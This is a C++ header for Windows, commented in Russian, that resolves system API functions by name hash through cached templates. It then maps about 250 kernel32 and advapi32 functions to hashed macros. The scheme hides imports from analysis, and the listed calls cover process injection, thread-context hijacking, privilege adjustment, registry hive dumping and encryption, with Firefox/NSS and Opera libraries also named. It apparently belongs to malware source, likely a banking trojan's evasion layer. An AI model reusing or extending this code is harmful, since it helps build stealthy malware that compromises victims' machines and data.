
#ifndef GetApiH
#define GetApiH
//----------------------------------------------------------------------------
#pragma once
#include <windows.h>


//*******************************************************************
//  InitializeAPI - Функция инициализирует систему для работы с АПИ
//
//  ВАЖНО!!!!!!!
//
//  Перед использованием АПИ в процессе необходимо провести
//  инициализацию
//
//
//*******************************************************************
BOOL InitializeAPI();



enum TDllId
{

	DLL_KERNEL32   = 1,
	DLL_ADVAPI32   = 2,
	DLL_USER32     = 3,
	DLL_WINSOCK    = 4,
	DLL_NTDLL      = 5,
	DLL_WINSTA     = 6,
	DLL_SHELL32    = 7,
	DLL_WININET    = 8,
	DLL_URLMON     = 9,
	DLL_NSPR4      = 10,
	DLL_SSL3       = 11,
	DLL_WINMM      = 12,
	DLL_CABINET    = 13,
	DLL_OPERA      = 14,
	DLL_GDI		   = 15,  /* gdi32.dll */
	DLL_GDIPLUS	   = 16,  /* gdiplus.dll */
	DLL_CRYPT32	   = 17,  /* crypt32.dll */
	DLL_PSAPI	   = 18,  /* psapi.dll */
	DLL_SHLWAPI	   = 19,  /* shlwapi.dll */
	DLL_IPHLPAPI   = 20,  /* Iphlpapi.dll */
	DLL_WINSPOOL   = 21,  /* winspool_drv* */
	DLL_COMANDLG32 = 22,  /* commdlg32_dll */
	DLL_ODBC32	   = 23,  /* odbc32_dll */
	DLL_VERSION    = 24,  /* version.dll */
	DLL_OLE32      = 25,  /* ole32.dll */
	DLL_IMAGEHLP   = 26   /* Imagehlp.dll */	
};


//---------------------------------------------------------------------
//  GetDLLName -  Функция возвращает имя библиотеки
//---------------------------------------------------------------------
PCHAR GetDLLName(TDllId ID);

DWORD GetImageBase();


LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash );
HMODULE GetDllBase( DWORD dwDllHash );
HMODULE GetKernel32();

#define RVATOVA( base, offset ) ( (DWORD)base + (DWORD)offset )

LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash);
LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int CacheIndex);

DWORD pGetLastError();


template <DWORD h, DWORD hash, int CacheIndex>
inline LPVOID pushargEx()
{
	typedef LPVOID (WINAPI *newfunc)();
	newfunc func = (newfunc)GetProcAddressEx2(NULL, h, hash, CacheIndex );
	return func();
}

template <DWORD h, DWORD hash, int CacheIndex, class A>
inline LPVOID pushargEx(A a1)
{
	typedef LPVOID (WINAPI *newfunc)(A);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B>
inline LPVOID pushargEx(A a1,  B a2)
{
	typedef LPVOID (WINAPI *newfunc)(A, B);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1,a2);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C>
inline LPVOID pushargEx(A a1,  B a2, C a3)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1,a2,a3);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1,a2,a3,a4);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11 )
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y, class Z, class R>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11, Z a12, R a13)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y, Z, R);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
}

template <DWORD h, DWORD hash, int CacheIndex, class A1, class A2, class A3, class A4, class A5,
	class A6, class A7, class A8, class A9, class A10, class A11, class A12>
inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
						A9 a9, A10 a10, A11 a11, A12 a12)
{
	typedef LPVOID (WINAPI *newfunc)(A1, A2, A3, A4, A5, A6, A7, A8, A9, A10,
									A11, A12);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
}




//******************************************************************
//
//  ФАЖНО!!!!
//
//  Индексы кэша (третий параметр в объявлении) строжайше запрещено
//  менять вручную!!!!
//
//  Индексы кэша автоматически проставляет служебная утилита.
//  При добавлении новой функции, индекс указывать 0
//
//  Например:
//
//  #define pCustomFunc pushargEx< DLL_KERNEL32, 0xC8AC8026, 1 >
//
//******************************************************************


//**************************************************
// Размер кэша хранения адресов функций
//
// Значение автоматически устанавливается утилитой
//
// Не переименовывать, не изменять значение!!!!!!!
//
//**************************************************
const static int ApiCacheSize = 538;



//kernel32
#define pLoadLibraryA 				pushargEx< DLL_KERNEL32, 0xC8AC8026, 2 >
#define pLoadLibraryW 				pushargEx< DLL_KERNEL32, 0xC8AC8030, 3 >
#define pLoadLibraryExA 			pushargEx< DLL_KERNEL32, 0x20088E6A, 4 >
#define pLoadLibraryExW 			pushargEx< DLL_KERNEL32, 0x20088E7C, 5 >
#define pFreeLibrary 				pushargEx< DLL_KERNEL32, 0x4B935B8E, 6 >
#define pGetProcAddress 			pushargEx< DLL_KERNEL32, 0x1FC0EAEE, 7 >
#define pTerminateProcess			pushargEx< DLL_KERNEL32, 0x9E6FA842, 8 >
#define pVirtualAlloc 				pushargEx< DLL_KERNEL32, 0x697A6AFE, 9 >
#define pVirtualAllocEx 			pushargEx< DLL_KERNEL32, 0x9ABFB8A6, 10 >
#define pVirtualFree 				pushargEx< DLL_KERNEL32, 0x3A35705F, 11 >
#define pVirtualFreeEx 				pushargEx< DLL_KERNEL32, 0x5C17EC75, 12 >
#define pVirtualQuery 				pushargEx< DLL_KERNEL32, 0x6A582465, 13 >
#define pVirtualQueryEx 			pushargEx< DLL_KERNEL32, 0x919786E, 14 >
#define pVirtualProtect 			pushargEx< DLL_KERNEL32, 0xA9DE6F5A, 15 >
#define pVirtualProtectEx 			pushargEx< DLL_KERNEL32, 0x9BD6888F, 16 >
#define pCloseHandle 				pushargEx< DLL_KERNEL32, 0x723EB0D5, 17 >
#define pGlobalAlloc 				pushargEx< DLL_KERNEL32, 0x725EA171, 18 >
#define pGlobalFree 				pushargEx< DLL_KERNEL32, 0x240339C8, 19 >
#define pCreateFileA 				pushargEx< DLL_KERNEL32, 0x8F8F114, 20 >
#define pCreateFileW 				pushargEx< DLL_KERNEL32, 0x8F8F102, 21 >
#define pWriteFile 					pushargEx< DLL_KERNEL32, 0xF3FD1C3, 22 >
#define pGetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xC80715CE, 23 >
#define pWriteProcessMemory 		pushargEx< DLL_KERNEL32, 0xBEA0BF35, 24 >
#define pCreateRemoteThread 		pushargEx< DLL_KERNEL32, 0xE61874B3, 25 >
#define pReadFile 					pushargEx< DLL_KERNEL32, 0x487FE16B, 26 >
#define pSetFilePointer 			pushargEx< DLL_KERNEL32, 0xEF48E03A, 27 >
#define pSetEndOfFile 				pushargEx< DLL_KERNEL32, 0x2D0D9D61, 28 >
#define pCopyFileA 					pushargEx< DLL_KERNEL32, 0x2EE4F10D, 29 >
#define pCopyFileW 					pushargEx< DLL_KERNEL32, 0x2EE4F11B, 30 >
#define pMoveFileA 					pushargEx< DLL_KERNEL32, 0x20E4E9ED, 31 >
#define pMoveFileW 					pushargEx< DLL_KERNEL32, 0x20E4E9FB, 32 >
#define pMoveFileExA 				pushargEx< DLL_KERNEL32, 0x3A7A7478, 33 >
#define pMoveFileExW 				pushargEx< DLL_KERNEL32, 0x3A7A746E, 34 >
#define pDeleteFileA 				pushargEx< DLL_KERNEL32, 0x81F0F0DF, 35 >
#define pDeleteFileW 				pushargEx< DLL_KERNEL32, 0x81F0F0C9, 36 >
#define pGetFileSize 				pushargEx< DLL_KERNEL32, 0xAEF7CBF1, 37 >
#define pCreateFileMappingA 		pushargEx< DLL_KERNEL32, 0xEF0A25B7, 38 >
#define pCreateFileMappingW 		pushargEx< DLL_KERNEL32, 0xEF0A25A1, 39 >
#define pMapViewOfFile 				pushargEx< DLL_KERNEL32, 0x5CD9430, 40 >
#define pGetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C071, 41 >
#define pSetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C571, 42 >
#define pGetModuleHandleA 			pushargEx< DLL_KERNEL32, 0xA48D6762, 43 >
#define pGetModuleHandleW 			pushargEx< DLL_KERNEL32, 0xA48D6774, 44 >
#define pUnmapViewOfFile 			pushargEx< DLL_KERNEL32, 0x77CD9567, 45 >
#define pWaitForSingleObject 		pushargEx< DLL_KERNEL32, 0xC54374F3, 46 >
#define pSleep 						pushargEx< DLL_KERNEL32, 0x3D9972F5, 47 >
#define pWideCharToMultiByte 		pushargEx< DLL_KERNEL32, 0xE74F57EE, 48 >
#define pMultiByteToWideChar 		pushargEx< DLL_KERNEL32, 0x5AA7E70B, 49 >
#define pGetModuleFileNameA 		pushargEx< DLL_KERNEL32, 0x774393E8, 50 >
#define pGetModuleFileNameW 		pushargEx< DLL_KERNEL32, 0x774393FE, 51 >
#define pGetSystemDirectoryA 		pushargEx< DLL_KERNEL32, 0x49A1374A, 52 >
#define pGetSystemDirectoryW 		pushargEx< DLL_KERNEL32, 0x49A1375C, 53 >
#define pGetTempPathA 				pushargEx< DLL_KERNEL32, 0x58FE7ABE, 54 >
#define pGetTempPathW 				pushargEx< DLL_KERNEL32, 0x58FE7AA8, 55 >
#define pGetVolumeInformationA 		pushargEx< DLL_KERNEL32, 0x67ECDE97, 56 >
#define pGetVolumeInformationW 		pushargEx< DLL_KERNEL32, 0x67ECDE81, 57 >
#define pSetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x4D5587B7, 58 >
#define pSetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x4D5587A1, 59 >
#define pCreateProcessA 			pushargEx< DLL_KERNEL32, 0x46318AC7, 60 >
#define pCreateProcessW 			pushargEx< DLL_KERNEL32, 0x46318AD1, 61 >
#define pGetVersionExA 				pushargEx< DLL_KERNEL32, 0x9C480E24, 62 >
#define pGetVersionExW 				pushargEx< DLL_KERNEL32, 0x9C480E32, 63 >
#define pCreateThread 				pushargEx< DLL_KERNEL32, 0x6FB89AF0, 64 >
#define pSetThreadPriority			pushargEx< DLL_KERNEL32, 0xBC262395, 65 >
#define pCreateMutexA 				pushargEx< DLL_KERNEL32, 0xBF78969C, 66 >
#define pCreateMutexW 				pushargEx< DLL_KERNEL32, 0xBF78968A, 67 >
#define pReleaseMutex 				pushargEx< DLL_KERNEL32, 0xBB74A4A2, 68 >
#define pGetVersion 				pushargEx< DLL_KERNEL32, 0xCB932CE2, 69 >
#define pDeviceIoControl 			pushargEx< DLL_KERNEL32, 0x82E8173, 70 >
#define pQueryDosDeviceA 			pushargEx< DLL_KERNEL32, 0xAC81BECB, 71 >
#define pQueryDosDeviceW 			pushargEx< DLL_KERNEL32, 0xAC81BEDD, 72 >
#define pIsBadReadPtr 				pushargEx< DLL_KERNEL32, 0x7D544DBD, 73 >
#define pIsBadWritePtr 				pushargEx< DLL_KERNEL32, 0xAC85818D, 74 >
#define pGetCurrentProcess 			pushargEx< DLL_KERNEL32, 0xD89AD05, 75 >
#define pCreateEventW 				pushargEx< DLL_KERNEL32, 0x8D5A50CA, 76 >
#define pSetEvent 					pushargEx< DLL_KERNEL32, 0x5E7EE0D0, 77 >
#define pResetEvent 				pushargEx< DLL_KERNEL32, 0x3B3EE0F9, 78 >
#define pGetShortPathNameA 			pushargEx< DLL_KERNEL32, 0x223296ED, 79 >
#define pGetShortPathNameW 			pushargEx< DLL_KERNEL32, 0x223296FB, 80 >
#define pLocalFree 					pushargEx< DLL_KERNEL32, 0x84033DEB, 81 >
#define pGetPrivateProfileStringA 	pushargEx< DLL_KERNEL32, 0xAA19E291, 82 >
#define pGetPrivateProfileStringW 	pushargEx< DLL_KERNEL32, 0xAA19E287, 83 >
#define pGetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x475587B7, 84 >
#define pGetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x475587A1, 85 >
#define pGetEnvironmentVariableA 	pushargEx< DLL_KERNEL32, 0x9802EF30, 86 >
#define pGetEnvironmentVariableW 	pushargEx< DLL_KERNEL32, 0x9802EF26, 87 >
#define pReadProcessMemory 			pushargEx< DLL_KERNEL32, 0x9D00A761, 88 >
#define pExitProcess 				pushargEx< DLL_KERNEL32, 0x95902B19, 89 >
#define pOpenProcess 				pushargEx< DLL_KERNEL32, 0x99A4299D, 90 >
#define pGetCurrentProcessId		pushargEx< DLL_KERNEL32, 0x6B416786, 91 >
#define pProcess32First 			pushargEx< DLL_KERNEL32, 0x19F78C90, 92 >
#define pProcess32Next 				pushargEx< DLL_KERNEL32, 0xC930EA1E, 93 >
#define pCreateToolhelp32Snapshot	pushargEx< DLL_KERNEL32, 0x5BC1D14F, 94 >
#define pWinExec 					pushargEx< DLL_KERNEL32, 0xE8BF6DAD, 95 >
#define pFindResourceA 				pushargEx< DLL_KERNEL32, 0x8FE060C, 96 >
#define pSetLastError 				pushargEx< DLL_KERNEL32, 0x1295012C, 97 >
#define pLoadResource 				pushargEx< DLL_KERNEL32, 0x1A10BD8B, 98 >
#define pLockResource 				pushargEx< DLL_KERNEL32, 0x1510BD8A, 99 >
#define pSizeofResource 			pushargEx< DLL_KERNEL32, 0x86867F0E, 100 >
#define pLockRsrc 					pushargEx< DLL_KERNEL32, 0xBAC5467D, 101 >
#define pGetTempFileNameA 			pushargEx< DLL_KERNEL32, 0xFA4F502, 102 >
#define pGetTempFileNameW 			pushargEx< DLL_KERNEL32, 0xFA4F514, 103 >
#define pGetLongPathNameA 			pushargEx< DLL_KERNEL32, 0x9835D5A1, 104 >
#define pCreateEventA				pushargEx< DLL_KERNEL32, 0x8D5A50DC, 105 >
#define pConnectNamedPipe			pushargEx< DLL_KERNEL32, 0x7235F00E, 106 >
#define pDisconnectNamedPipe   		pushargEx< DLL_KERNEL32, 0x46C6B01F, 107 >
#define pCreateNamedPipeA			pushargEx< DLL_KERNEL32, 0x42F9BB48, 108 >
#define pGetTickCount				pushargEx< DLL_KERNEL32, 0x69260152, 109 >
#define pExitThread					pushargEx< DLL_KERNEL32, 0x768AA260, 110 >
#define plstrcmpiA					pushargEx< DLL_KERNEL32, 0x515BE757, 111 >
#define pSuspendThread				pushargEx< DLL_KERNEL32, 0xEEBA5EBA, 112 >
#define pGetComputerNameA			pushargEx< DLL_KERNEL32, 0x3DEF91BA, 113 >
#define pGetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DE02F, 114 >
#define pSetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DC82F, 115 >
#define pResumeThread				pushargEx< DLL_KERNEL32, 0x7B88BF3B, 116 >
#define pProcessIdToSessionId		pushargEx< DLL_KERNEL32, 0x654F3F9E, 117 >
#define	pWTSGetActiveConsoleSessionId	pushargEx< DLL_KERNEL32, 0x654FEEAC, 118 >
#define pOpenMutexA					pushargEx< DLL_KERNEL32, 0xAE52C609, 119 >
#define pCreateProcessInternalA		pushargEx< DLL_KERNEL32, 0xE24394E4, 120 >
#define pCreateProcessInternalW		pushargEx< DLL_KERNEL32, 0xE24394F2, 121 >
#define pTerminateThread			pushargEx< DLL_KERNEL32, 0xC09D5D66, 122 >
#define plopen						pushargEx< DLL_KERNEL32, 0xCDFC3010, 123 >
#define plstrcmpA					pushargEx< DLL_KERNEL32, 0x2CA2B7E6, 124 >
#define plstrcmpW					pushargEx< DLL_KERNEL32, 0x2CA2B7F0, 125 >
#define plstrcatA					pushargEx< DLL_KERNEL32, 0x2CA1B5E6, 126 >
#define plstrcatW					pushargEx< DLL_KERNEL32, 0x2CA1B5F0, 127 >
#define plstrcpyA					pushargEx< DLL_KERNEL32, 0x2CA5F366, 128 >
#define plstrcpyW					pushargEx< DLL_KERNEL32, 0x2CA5F370, 129 >
#define plstrlenA					pushargEx< DLL_KERNEL32, 0x2D40B8E6, 130 >
#define plstrlenW					pushargEx< DLL_KERNEL32, 0x2D40B8F0, 131 >
#define pThread32First				pushargEx< DLL_KERNEL32, 0x89B968D2, 132 >
#define pThread32Next				pushargEx< DLL_KERNEL32, 0x4C1077D6, 133 >
#define pOpenThread					pushargEx< DLL_KERNEL32, 0x7E92CA65, 134 >
#define pGetWindowsDirectoryA		pushargEx< DLL_KERNEL32, 0x78B00C7E, 135 >
#define pGetWindowsDirectoryW		pushargEx< DLL_KERNEL32, 0x78B00C68, 136 >
#define pFindFirstFileA				pushargEx< DLL_KERNEL32, 0x32432444, 137 >
#define pFindFirstFileW				pushargEx< DLL_KERNEL32, 0x32432452, 138 >
#define pFindNextFileA				pushargEx< DLL_KERNEL32, 0x279DEAD7, 139 >
#define pFindNextFileW				pushargEx< DLL_KERNEL32, 0x279DEAC1, 140 >
#define pFindClose  				pushargEx< DLL_KERNEL32, 0x7B4842C1, 141 >
#define pRemoveDirectoryA			pushargEx< DLL_KERNEL32, 0x4AE7572B, 142 >
#define pInitializeCriticalSection	pushargEx< DLL_KERNEL32, 0xDA81BC58, 143 >
#define pEnterCriticalSection		pushargEx< DLL_KERNEL32, 0xF3B84F05, 144 >
#define pLeaveCriticalSection		pushargEx< DLL_KERNEL32, 0x392B6027, 145 >
#define pDeleteCriticalSection		pushargEx< DLL_KERNEL32, 0x7B2D2505, 146 >
#define pGetProcessHeap				pushargEx< DLL_KERNEL32, 0x68807354, 147 >
#define pHeapAlloc					pushargEx< DLL_KERNEL32, 0x5550B067, 148 >
#define pHeapReAlloc				pushargEx< DLL_KERNEL32, 0xFC7A6EFD, 149 >
#define pHeapSize					pushargEx< DLL_KERNEL32, 0x0AEBEA6A, 150 >
#define pHeapFree					pushargEx< DLL_KERNEL32, 0x084D25EA, 151 >
#define pGetCurrentThreadId			pushargEx< DLL_KERNEL32, 0xA45B370A, 152 >
#define pGetCurrentThread   		pushargEx< DLL_KERNEL32, 0x4FBA916C, 153 >
#define	pGlobalLock					pushargEx< DLL_KERNEL32, 0x25447AC6, 154 >
#define	pGlobalUnlock				pushargEx< DLL_KERNEL32, 0xF50B872, 155 >
#define pSetErrorMode				pushargEx< DLL_KERNEL32, 0x6C544060, 156 >
#define pGetFileInformationByHandle pushargEx< DLL_KERNEL32, 0xF149BCC4, 157 >
#define pFileTimeToLocalFileTime	pushargEx< DLL_KERNEL32, 0xE5792E94, 158 >
#define pFileTimeToDosDateTime		pushargEx< DLL_KERNEL32, 0xB68EBEF8, 159 >
#define pOutputDebugStringA			pushargEx< DLL_KERNEL32, 0xD0498CD4, 160 >
#define pExpandEnvironmentStringsA	pushargEx< DLL_KERNEL32, 0x23EBE98B, 161 >
#define pExpandEnvironmentStringsW	pushargEx< DLL_KERNEL32, 0x23EBE99D, 162 >
#define pOutputDebugStringW			pushargEx< DLL_KERNEL32, 0xD0498CC2, 163 >
#define pLocalAlloc 				pushargEx< DLL_KERNEL32, 0x725CB0A1, 164 >
#define pFindFirstChangeNotificationA pushargEx< DLL_KERNEL32, 0xE8402F0, 165 >
#define pFindCloseChangeNotification  pushargEx< DLL_KERNEL32, 0x3634D801, 166 >
#define pFindNextChangeNotification   pushargEx< DLL_KERNEL32, 0xFAB3FE71, 167 >
#define pCreateDirectoryW			  pushargEx< DLL_KERNEL32, 0xA073561, 168 >
#define pCreateDirectoryA		    pushargEx< DLL_KERNEL32, 0xA073577, 169 >
#define pOpenEventW					pushargEx< DLL_KERNEL32, 0x9C70005F, 170 >
#define pGetSystemTimeAsFileTime	pushargEx< DLL_KERNEL32, 0x6951E92A, 171 >
#define pGetSystemTime 				pushargEx< DLL_KERNEL32, 0x270118E2, 172 >
#define pFileTimeToSystemTime		pushargEx< DLL_KERNEL32, 0x3B429F5F, 173 >
#define pCompareFileTime			pushargEx< DLL_KERNEL32, 0x41C9C8F5, 174 >
#define pSystemTimeToFileTime		pushargEx< DLL_KERNEL32, 0xEA7EA921, 175 >
#define pGetLogicalDriveStringsA  	pushargEx< DLL_KERNEL32, 0x70F6FE31, 176 >
#define pGetDriveTypeA          	pushargEx< DLL_KERNEL32, 0x399354CE, 177 >
#define pSleepEx				 	pushargEx< DLL_KERNEL32, 0x5CBD6D9E, 178 >
#define pGetProcessId				pushargEx< DLL_KERNEL32, 0x0e91a280, 179 >
#define pOpenEventA					pushargEx< DLL_KERNEL32, 0x9C700049, 180 >
#define pSetCurrentDirectoryW		pushargEx< DLL_KERNEL32, 0xc8071758, 181 >
#define pSetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xc807174e, 182 >
#define pDuplicateHandle			pushargEx< DLL_KERNEL32, 0x533d3b41, 183 >
#define pGetExitCodeThread			pushargEx< DLL_KERNEL32, 0x4E5A10B1, 184 >
#define pGetCommandLineA			pushargEx< DLL_KERNEL32, 0xFB0730C, 185 >
#define pGetPrivateProfileIntA		pushargEx< DLL_KERNEL32, 0x11CC0678, 186 >
#define pProcess32FirstW 			pushargEx< DLL_KERNEL32, 0xFBC6485B, 187 >
#define pProcess32NextW				pushargEx< DLL_KERNEL32, 0x98750F33, 188 >
#define pGetLogicalDrives			pushargEx< DLL_KERNEL32, 0x6A3376B7, 189 >
#define pInterlockedIncrement		pushargEx< DLL_KERNEL32, 0xD03C6D18, 190 >
#define pInterlockedDecrement		pushargEx< DLL_KERNEL32, 0xDD2A6D18, 191 >
#define pFlushViewOfFile			pushargEx< DLL_KERNEL32, 0x664FD32B, 192 >
#define pGetExitCodeProcess			pushargEx< DLL_KERNEL32, 0xFDC94385, 193 >
#define pFlushFileBuffers			pushargEx< DLL_KERNEL32, 0x2f2feeda, 194 >	

//advapi32
#define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4, 195 >
#define pSetThreadToken				pushargEx< DLL_ADVAPI32, 0xA16FE0FD, 196 >
#define pOpenProcessToken 			pushargEx< DLL_ADVAPI32, 0x80DBBE07, 197 >
#define pLookupPrivilegeValueA 		pushargEx< DLL_ADVAPI32, 0x1B3D12B9, 198 >
#define pLookupPrivilegeValueW 		pushargEx< DLL_ADVAPI32, 0x1B3D12AF, 199 >
#define pAdjustTokenPrivileges 		pushargEx< DLL_ADVAPI32, 0x7A2167DC, 200 >
#define pRegOpenKeyExA 				pushargEx< DLL_ADVAPI32, 0xAAD67FF8, 201 >
#define pRegOpenKeyExW 				pushargEx< DLL_ADVAPI32, 0xAAD67FEE, 202 >
#define pRegQueryInfoKeyA 			pushargEx< DLL_ADVAPI32, 0xBDF4DB19, 203 >
#define pRegQueryInfoKeyW 			pushargEx< DLL_ADVAPI32, 0xBDF4DB0F, 204 >
#define pRegEnumKeyExA 				pushargEx< DLL_ADVAPI32, 0xB4F673FD, 205 >
#define pRegEnumKeyExW 				pushargEx< DLL_ADVAPI32, 0xB4F673EB, 206 >
#define pRegEnumValueA 				pushargEx< DLL_ADVAPI32, 0xF65A7D95, 207 >
#define pRegEnumValueW 				pushargEx< DLL_ADVAPI32, 0xF65A7D83, 208 >
#define pRegQueryValueExA 			pushargEx< DLL_ADVAPI32, 0x1802E7C8, 209 >
#define pRegQueryValueExW 			pushargEx< DLL_ADVAPI32, 0x1802E7DE, 210 >
#define pRegCloseKey 				pushargEx< DLL_ADVAPI32, 0xDB355534, 211 >
#define pRegDeleteKeyA 				pushargEx< DLL_ADVAPI32, 0x398C5285, 212 >
#define pRegDeleteKeyW 				pushargEx< DLL_ADVAPI32, 0x398C5293, 213 >
#define pRegSetValueExA 			pushargEx< DLL_ADVAPI32, 0x3E400FD6, 214 >
#define pRegSetValueExW 			pushargEx< DLL_ADVAPI32, 0x3E400FC0, 215 >
#define pGetUserNameA 				pushargEx< DLL_ADVAPI32, 0xB9D41C2F, 216 >
#define pGetUserNameW 				pushargEx< DLL_ADVAPI32, 0xB9D41C39, 217 >
#define pOpenServiceA 				pushargEx< DLL_ADVAPI32, 0x83969964, 218 >
#define pStartServiceA 				pushargEx< DLL_ADVAPI32, 0x1CA1FD2F, 219 >
#define pGetKernelObjectSecurity 	pushargEx< DLL_ADVAPI32, 0xB29136DD, 220 >
#define pGetCurrentHwProfileA		pushargEx< DLL_ADVAPI32, 0xF684C7A9, 222 >
#define pGetTokenInformation		pushargEx< DLL_ADVAPI32, 0xD4ECC759, 223 >
#define pInitializeSecurityDescriptor	pushargEx< DLL_ADVAPI32, 0xB8538A52, 224 >
#define pSetSecurityDescriptorOwner	pushargEx< DLL_ADVAPI32, 0xDADD5994, 225 >
#define pSetSecurityDescriptorDacl	pushargEx< DLL_ADVAPI32,0xCCD03C3A, 226 >
#define pSetFileSecurityW			pushargEx< DLL_ADVAPI32, 0x5A9B2FDD, 227 >
#define pRegCreateKeyW				pushargEx< DLL_ADVAPI32, 0xAE9E4290, 228 >
#define pRegCreateKeyA				pushargEx< DLL_ADVAPI32, 0xAE9E4286, 229 >
#define pRegCreateKeyExW			pushargEx< DLL_ADVAPI32, 0x90A097F0, 230 >
#define pRegCreateKeyExA			pushargEx< DLL_ADVAPI32, 0x90A097E6, 231 >
#define pRegSaveKeyA				pushargEx< DLL_ADVAPI32, 0xBEDEEFC5, 232 >
#define pRegSaveKeyW				pushargEx< DLL_ADVAPI32, 0xBEDEEFD3, 233 >
#define pRegSaveKeyExA				pushargEx< DLL_ADVAPI32, 0xBBF053F6, 234 >
#define pRegSaveKeyExW				pushargEx< DLL_ADVAPI32, 0xBBF053E0, 235 >
#define pCryptAcquireContextA		pushargEx< DLL_ADVAPI32, 0x8AD7DE34, 236 >
#define pCryptReleaseContext		pushargEx< DLL_ADVAPI32, 0x72760BB8, 237 >
#define pCryptImportKey     		pushargEx< DLL_ADVAPI32, 0x78660DBE, 238 >
#define pCryptEncrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF13BE, 239 >
#define pCryptDecrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF17E6, 240 >
#define pCryptSetKeyParam   		pushargEx< DLL_ADVAPI32, 0x37A53419, 241 >
#define pCryptDestroyKey    		pushargEx< DLL_ADVAPI32, 0xD4B3D42, 242 >
#define pQueryServiceStatusEx		pushargEx< DLL_ADVAPI32, 0xF6C712F4, 244 >
#define pRegDeleteValueA			pushargEx< DLL_ADVAPI32, 0x560c7c4a, 245 >
#define pAllocateAndInitializeSid	pushargEx< DLL_ADVAPI32, 0x28E9E291, 246 >
#define pCheckTokenMembership		pushargEx< DLL_ADVAPI32, 0x87FEDB50, 247 >
